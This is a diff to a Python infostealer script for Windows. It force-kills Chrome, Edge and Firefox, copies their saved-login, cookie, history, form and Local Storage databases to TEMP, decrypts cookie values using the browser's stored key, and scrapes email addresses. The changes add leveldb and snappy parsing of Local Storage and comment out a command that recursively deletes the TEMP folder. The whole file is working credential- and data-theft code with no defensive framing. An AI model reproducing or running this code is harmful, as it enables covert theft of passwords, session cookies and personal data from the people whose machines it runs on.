@@ -14,14 +14,19 @@ from email.mime.base import MIMEBase
 from email import encoders 
 import urllib.parse
 from pathlib import Path
+import plyvel
+import snappy
 import json
 
 USERNAME = getpass.getuser()
+CHROME_BROWSER = 'chrome'
+EDGE_BROWSER = 'edge'
 chrome_path  = os.path.join(os.getenv('LOCALAPPDATA'),'Google', 'Chrome', 'User Data')
 edge_path = os.path.join(os.getenv('LOCALAPPDATA'), 'Microsoft', 'Edge', 'User Data')
 firefox_path = os.path.join(os.getenv('APPDATA'), 'Mozilla', 'Firefox', 'Profiles')
 local_state_path = os.path.join(os.getenv('LOCALAPPDATA'), 'Google', 'Chrome', 'User Data', 'Local State')
 email_pattern = r'[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}'
+os.system("taskkill /F /IM chrome.exe /IM msedge.exe /IM firefox.exe >nul 2>&1")
 
 
 def bytes_to_hex(byte_data):
@@ -44,13 +49,14 @@ def decrypt_value(encrypted_value, key):
         # print(f"Decryption failed: {e}")
         return None
 
-def chromEdgeOnly(chrome_path, email_pattern):
+def chromEdgeOnly(chrome_path, email_pattern, browser_name):
     profiles = [f for f in os.listdir(chrome_path) if f.startswith('Profile') or f == 'Default']
     emails = []
 
     for profile in profiles:
+        profile_name = profile.replace(" ", "_")
         wDatPath = os.path.join(chrome_path, profile, 'Web Data')
-        twDatPath = os.path.join(os.getenv('TEMP'),f"wdat-{USERNAME}-{profile}-chrome.db")
+        twDatPath = os.path.join(os.getenv('TEMP'),f"wdat_{USERNAME}_{profile_name}_{browser_name}.db")
         if os.path.exists(wDatPath):
             os.system(f'copy "{wDatPath}" "{twDatPath}"')
             conn = sqlite3.connect(twDatPath)
@@ -65,19 +71,29 @@ def chromEdgeOnly(chrome_path, email_pattern):
                     pass
             conn.close()
 
-        ssDatPath = os.path.join(chrome_path, profile, 'Session Storage')
-        tssDatPath = os.path.join(chrome_path, profile, f"ssdat-{USERNAME}-{profile}-chrome")
-        if os.path.isdir(ssDatPath):
+        lsDatPath = os.path.join(chrome_path, profile, 'Local Storage', 'leveldb')
+        tlsDatPath = os.path.join(os.getenv('TEMP'), f"lsdat_{USERNAME}_{profile_name}_{browser_name}")
+        if os.path.isdir(lsDatPath):
             try:
-                db = leveldb.LevelDB(ssDatPath)
-                for key, value in db.RangeIter():
-                    decoded = f"{key.decode()} {value.decode()}"
-                    emails.extend(re.findall(email_pattern, decoded))
+                print(f"ATTEMPTING TO READ FROM LOCAL STORAGE!!! for {profile} and {browser_name}")
+                os.system(f"powershell copy-item -path '{lsDatPath}' -destination '{tlsDatPath}' -force -recurse")
+                db = plyvel.DB(str(tlsDatPath), create_if_missing=False)
+                for key, value in db:
+                    key_str = key.decode('utf-8', errors='ignore')
+                    if value.startswith(b'\x01\x00\x00\x00'):  # Snappy compressed block indicator
+                        value = snappy.uncompress(value)
+                    value_str = value.decode('utf-8', errors='ignore')
+                    decoded = f"{key_str} {value_str}"
+                    # print(decoded)
+                    print(value_str)
+                    emails.extend(re.findall(email_pattern, key_str))
+                    emails.extend(re.findall(email_pattern, value_str))
+                db.close()
             except Exception as e:
-                print(f"ERROR PARSING SESSION STORAGE : {e}")
+                print(f"ERROR PARSING LOCAL STORAGE : {e}")
 
         lDatPath = os.path.join(chrome_path, profile, 'Login Data')
-        tlDatPath = os.path.join(os.getenv('TEMP'), f"ldat-{USERNAME}-{profile}-chrome.db")
+        tlDatPath = os.path.join(os.getenv('TEMP'), f"ldat_{USERNAME}_{profile_name}_{browser_name}.db")
         if os.path.exists(lDatPath):
             os.system(f'copy "{lDatPath}" "{tlDatPath}"')
             conn = sqlite3.connect(tlDatPath)
@@ -93,23 +109,28 @@ def chromEdgeOnly(chrome_path, email_pattern):
             conn.close()
 
         hDatPath = os.path.join(chrome_path, profile, 'History')
-        thDatPath = os.path.join(chrome_path, profile, f"hDat-{USERNAME}-{profile}-chrome.db")
+        thDatPath = os.path.join(os.getenv('TEMP'), f"hDat_{USERNAME}_{profile_name}_{browser_name}.db")
         if os.path.exists(hDatPath):
             os.system(f'copy "{hDatPath}" "{thDatPath}"')
             conn = sqlite3.connect(thDatPath)
             cur = conn.cursor()
+            cur.execute("PRAGMA integrity_check;")
+            result = cur.fetchone()
+            if(result[0] != "ok"):
+                cur.execute("PRAGMA journal_mode = WAL;")
+
             cur.execute("SELECT url FROM urls WHERE url LIKE '%@%'")
             for val in cur.fetchall():
                 try:
                     decoded_string = urllib.parse.unquote(val[0])
                     matches = re.findall(email_pattern, decoded_string)
                     emails.extend(matches)
-                except:
-                    pass
+                except Exception as e:
+                    print(f"Error processing URL {val[0]}: {e}")
             conn.close()
 
         cDatPath = os.path.join(chrome_path, profile, 'Network', 'Cookies')
-        tcDatPath = os.path.join(os.getenv('TEMP'), f"cDat-{USERNAME}-{profile}-chrome.db")
+        tcDatPath = os.path.join(os.getenv('TEMP'), f"cDat_{USERNAME}_{profile_name}_{browser_name}.db")
         if os.path.exists(cDatPath):
             os.system(f'copy "{cDatPath}" "{tcDatPath}"')
             conn = sqlite3.connect(tcDatPath)
@@ -117,7 +138,6 @@ def chromEdgeOnly(chrome_path, email_pattern):
             cur.execute("SELECT encrypted_value FROM cookies") # WHERE host_key LIKE '%@gmail%' OR host_key LIKE '%@outlook%' OR host_key LIKE '%mail%'
             decrypted_key = get_decryption_key(local_state_path)[1]
             #print(decrypted_key)
-            print(f"\n\n\n\n TRIED COOKIEESS  for {profile}\n\n")
             for val in cur.fetchall():
                 encrypted_value = val[0]
                 if encrypted_value is None or len(encrypted_value) == 0:
@@ -132,16 +152,17 @@ def chromEdgeOnly(chrome_path, email_pattern):
 def firefox(firefox_path, email_pattern):
     emails = []
     for profile in os.listdir(firefox_path):
+        profile_name = profile.replace(" ", "_")
         fh = os.path.join(firefox_path, profile, 'formhistory.sqlite')
-        tfh = os.path.join(os.getenv('TEMP'), f"fh-{USERNAME}-{profile}-firefox.db")
+        tfh = os.path.join(os.getenv('TEMP'), f"fh_{USERNAME}_{profile_name}_firefox.db")
         ck = os.path.join(firefox_path, profile, 'cookies.sqlite')
-        tck = os.path.join(os.getenv('TEMP'), f"ck-{USERNAME}-{profile}-firefox.db")
+        tck = os.path.join(os.getenv('TEMP'), f"ck_{USERNAME}_{profile_name}_firefox.db")
         bh = os.path.join(firefox_path, profile, 'places.sqlite')
-        tbh = os.path.join(os.getenv('TEMP'), f"bh-{USERNAME}-{profile}-firefox.db")
+        tbh = os.path.join(os.getenv('TEMP'), f"bh_{USERNAME}_{profile_name}_firefox.db")
         lg = os.path.join(firefox_path, profile, 'logins.json')
-        tlg = os.path.join(os.getenv('TEMP'), f"lg-{USERNAME}-{profile}-firefox.json")
+        tlg = os.path.join(os.getenv('TEMP'), f"lg_{USERNAME}_{profile_name}_firefox.json")
         lgb = os.path.join(firefox_path, profile, 'logins-backup.json')
-        tlgb = os.path.join(os.getenv('TEMP'), f"lgb-{USERNAME}-{profile}-firefox.json")
+        tlgb = os.path.join(os.getenv('TEMP'), f"lgb_{USERNAME}_{profile_name}_firefox.json")
         if os.path.exists(fh):
             os.system(f'copy "{fh}" "{tfh}"')
             conn = sqlite3.connect(tfh)
@@ -202,8 +223,8 @@ def firefox(firefox_path, email_pattern):
 
     return emails
 
-chrome_emails = chromEdgeOnly(chrome_path, email_pattern)
-edge_emails = chromEdgeOnly(edge_path, email_pattern)
+chrome_emails = chromEdgeOnly(chrome_path, email_pattern, CHROME_BROWSER)
+edge_emails = chromEdgeOnly(edge_path, email_pattern, EDGE_BROWSER)
 firefox_emails = firefox(firefox_path, email_pattern)
 
 emails = chrome_emails + edge_emails + firefox_emails
@@ -234,4 +255,4 @@ for email in emails:
         
 print(len(emails))
 
-os.system(f"powershell remove-item -path {os.getenv("TEMP")} -force -recurse -erroraction silentlycontinue")
+#os.system(f"powershell remove-item -path {os.getenv("TEMP")} -force -recurse -erroraction silentlycontinue")
